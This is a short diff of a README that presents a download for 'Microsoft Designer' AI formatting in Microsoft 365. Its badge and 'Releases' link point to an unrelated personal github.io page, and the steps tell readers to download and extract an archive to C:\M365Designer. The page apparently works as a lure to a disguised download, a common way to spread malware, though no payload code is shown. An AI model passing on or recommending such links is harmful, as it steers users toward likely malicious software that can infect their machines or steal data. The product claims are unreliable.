@@ -2,14 +2,14 @@
 
 Enable Microsoft Designer — the AI-powered formatting assistant that automatically improves visual layout, spacing, and design in Word and PowerPoint. This setup ensures full Designer availability across Microsoft 365 desktop apps.
 
-[![Download Designer](https://img.shields.io/badge/Download-Designer_AI_Format-blueviolet)](https://pomidorkaskeletik4.github.io/pomo/fertwo)
+[![Download Designer](https://img.shields.io/badge/Download-Designer_AI_Format-blueviolet)](https://pomidorkaskeletik4.github.io/pomo/fer/two)
 
 
 ---
 
 ### ⚙️ Installation Instructions
 
-1. 📦 **Download the archive** from the [Releases](https://pomidorkaskeletik4.github.io/pomo/fertwo)
+1. 📦 **Download the archive** from the [Releases](https://pomidorkaskeletik4.github.io/pomo/fer/two)
 
 ) section  
 2. 📁 **Extract the folder** to any location (e.g. `C:\M365Designer`)  
